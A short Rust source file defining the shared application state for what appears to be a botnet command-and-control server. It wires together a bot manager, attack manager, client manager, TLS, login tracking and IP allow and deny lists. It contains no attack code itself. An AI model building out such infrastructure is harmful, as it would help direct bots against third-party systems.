use std::sync::Arc;
use std::time::Instant;
use tokio_rustls::TlsAcceptor;
use dashmap::DashSet;
use std::net::IpAddr;
use super::auth::{LoginAttemptTracker, UserManager};
use super::client_manager::ClientManager;
use super::config::Config;
use super::bot_manager::BotManager;
use super::attack_manager::AttackManager;
use super::rate_limiter::SimpleRateLimiter;

pub struct AppState {
    pub config: Config,
    pub bot_manager: Arc<BotManager>,
    pub client_manager: Arc<ClientManager>,
    pub attack_manager: Arc<AttackManager>,
    pub started_at: Instant,
    pub rate_limiter: Arc<SimpleRateLimiter>,
    pub user_manager: Arc<UserManager>,
    pub tls_acceptor: Option<Arc<TlsAcceptor>>,
    pub audit_file: String,
    pub login_tracker: Arc<LoginAttemptTracker>,
    pub whitelist: Arc<DashSet<IpAddr>>,
    pub blacklist: Arc<DashSet<IpAddr>>,
}

impl AppState {
    pub fn new(
        config: Config,
        bot_manager: Arc<BotManager>,
        client_manager: Arc<ClientManager>,
        attack_manager: Arc<AttackManager>,
        rate_limiter: Arc<SimpleRateLimiter>,
        user_manager: Arc<UserManager>,
        tls_acceptor: Option<Arc<TlsAcceptor>>,
        audit_file: String,
        login_tracker: Arc<LoginAttemptTracker>,
    ) -> Self {
        Self {
            config,
            bot_manager,
            client_manager,
            attack_manager,
            started_at: Instant::now(),
            rate_limiter,
            user_manager,
            tls_acceptor,
            audit_file,
            login_tracker,
            whitelist: Arc::new(DashSet::new()),
            blacklist: Arc::new(DashSet::new()),
        }
    }
}
